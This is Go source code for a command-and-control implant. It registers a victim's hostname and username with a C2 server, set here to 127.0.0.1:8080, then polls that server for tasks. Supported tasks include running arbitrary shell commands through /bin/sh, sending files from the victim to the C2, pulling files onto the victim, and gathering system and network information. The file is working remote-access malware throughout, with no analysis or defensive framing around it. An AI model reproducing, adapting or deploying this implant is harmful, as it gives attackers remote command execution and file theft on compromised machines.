package main

import (
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/jasonlvhit/gocron"
)

var (
	c2        = "127.0.0.1"
	port      = "8080"
	server    string
	sleeptime uint64 = 10
	id        string
	hostname  string
	username  string
)

func main() {
	netInfo()
	server = "http://" + c2 + ":" + port

	// get hostname
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "UNKNOWN"
	}

	// get username
	user, err := user.Current()
	if err != nil {
		user.Username = "UNKNOWN"
	}
	username = user.Username
	registerAgent(server, hostname, username)
}

func registerAgent(server string, hostname string, username string) {
	data := url.Values{
		"hostname": {hostname},
		"username": {username},
	}

	resp, err := http.PostForm(server+"/register", data)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	id = string(body)
	fmt.Println(id)
	startAgent()
}

func startAgent() {
	gocron.Every(sleeptime).Seconds().Do(checkIn)
	<-gocron.Start()
}

func checkIn() {
	//checkin will show that the agent is still connected and retrieve any new tasks
	data := url.Values{
		"id": {id},
	}
	resp, err := http.PostForm(server+"/tasks", data)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return
	}
	if string(body) == "" {
		fmt.Println("No new tasks!")
	} else {
		fmt.Println("Received Task: ", string(body))
		processTask(string(body))
	}

}

func processTask(task string) {
	if task == "getuid" {
		getUID(id)
	} else if strings.HasPrefix(task, "sleep") {
		adjustSleep(strings.Fields(task)[1])
	} else if task == "sysinfo" {
		getSysinfo()
	} else if task == "netinfo" {
		netInfo()
	} else if strings.HasPrefix(task, "cd") {
		changeDir(strings.Fields(task)[1])
	} else if task == "pwd" {
		wd, _ := os.Getwd()
		sendData(string(wd))
	} else if strings.HasPrefix(task, "chmod") {
		changePerms(strings.Fields(task)[1:])
	} else if strings.HasPrefix(task, "mkdir") {
		mkdir(strings.Fields(task)[1:])
	} else if strings.HasPrefix(task, "ls") {
		if len(strings.Fields(task)) == 1 {
			ls(".")
		} else {
			ls(strings.Fields(task)[1])
		}
	} else if strings.HasPrefix(task, "download") {
		download(strings.Fields(task)[1:])
	} else if strings.HasPrefix(task, "upload") {
		upload(strings.Fields(task)[1])
	} else if strings.HasPrefix(task, "exec") {
		if len(strings.Fields(task)) < 2 {
			return
		}
		execute(strings.Fields(task)[1:])
	}
}

func sendData(output string) {
	data := url.Values{
		"id":     {id},
		"output": {output},
	}
	resp, err := http.PostForm(server+"/results", data)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

func getUID(id string) {
	var output string
	hostname, _ = os.Hostname()
	test, _ := user.Current()
	username = test.Username
	uid := fmt.Sprint(os.Getuid())
	gid := fmt.Sprint(os.Getgid())
	output = username + "@" + hostname + " UID=" + uid + " GID=" + gid
	sendData(output)
}

func adjustSleep(time string) {
	sleepval, err := strconv.ParseUint(string(time), 10, 64)
	if err != nil {
		return
	} else {
		defer startAgent()
		gocron.Clear()
		sleeptime = sleepval
	}
}

func getSysinfo() {
	cpus := runtime.NumCPU()
	output := "Num CPUs: " + fmt.Sprint(cpus)
	sendData(output)
}

func execute(command []string) {
	c := strings.Join(command, " ")
	var outb, errb bytes.Buffer
	cmd := exec.Command("/bin/sh", "-c", c)
	cmd.Stdin = os.Stdin
	cmd.Stdout = &outb
	cmd.Stderr = &errb
	err := cmd.Run()
	if err != nil {
		fmt.Println(err)
	}
	sendData(outb.String())
}

func netInfo() {
	netInterfaces, err := net.Interfaces()
	if err != nil {
		fmt.Println(err)
	}
	var interfaceInfo = make(map[string]string)
	for _, netInterfaceName := range netInterfaces {
		name := netInterfaceName.Name
		netInterfaceTmp, _ := net.InterfaceByName(netInterfaceName.Name) // what am i even doing rn
		addresses, _ := netInterfaceTmp.Addrs()
		if len(addresses) < 1 {
			interfaceInfo[name] = "No Address"
		} else {
			interfaceInfo[name] = addresses[0].String()
		}
	}
	b := new(bytes.Buffer)
	for key, value := range interfaceInfo {
		fmt.Fprintf(b, "%s : %s\n", key, value)
	}
	sendData(b.String())

}

func changeDir(dir string) {
	var output string
	//currentDir, err := os.Getwd()
	err := os.Chdir(dir)
	if err != nil {
		output = "Path does not exist!"
	}
	currentDir, err := os.Getwd()
	if err != nil {
		return
	}

	output = "Dir set to: " + string(currentDir)
	sendData(output)
}

func changePerms(args []string) {
	mode, err := strconv.ParseUint(args[0], 8, 32)
	if err != nil {
		return
	}
	for _, file := range args[1:] {
		err = os.Chmod(file, os.FileMode(mode))
		if err != nil {
			continue
		}
	}
	output := "Done!"
	sendData(output)
}

func mkdir(names []string) {
	var output string
	for _, name := range names {
		err := os.Mkdir(name, 0755)
		if err != nil {
			continue
		}
	}
	output = "Done!"
	sendData(output)
}

func ls(path string) {
	var output string
	files, err := os.ReadDir(path)
	if err != nil {
		output = "There was an error"
		sendData(output)
		return
	}

	b := new(bytes.Buffer)
	for _, file := range files {
		info, err := file.Info()
		if err != nil {
			continue
		}
		fmt.Fprintf(b, "%s %d\t%s\t%s\n", info.Mode(), info.Size(), info.ModTime().Format(time.UnixDate), file.Name())
	}
	sendData(b.String())
}

func download(files []string) { // this func UPLOADS a file from the victim to the c2
	for _, file := range files {
		sendFile(file)
	}
}

func upload(file string) { // this func DOWNLOADS a file from the c2 to the victim
	resp, err := http.Get(server + "/" + file)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	out, err := os.Create(file)
	if err != nil {
		return
	}
	io.Copy(out, resp.Body)
}

func sendFile(filename string) {
	bodyBuf := &bytes.Buffer{}
	bodyWriter := multipart.NewWriter(bodyBuf)
	fileWriter, err := bodyWriter.CreateFormFile("uploadfile", filename)
	if err != nil {
		fmt.Println("error writing to buffer")
		return
	}

	fh, err := os.Open(filename)
	if err != nil {
		fmt.Println("error opening file")
		return
	}
	defer fh.Close()

	_, err = io.Copy(fileWriter, fh)
	if err != nil {
		return
	}

	contentType := bodyWriter.FormDataContentType()
	bodyWriter.Close()

	resp, err := http.Post(server+"/file", contentType, bodyBuf)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}
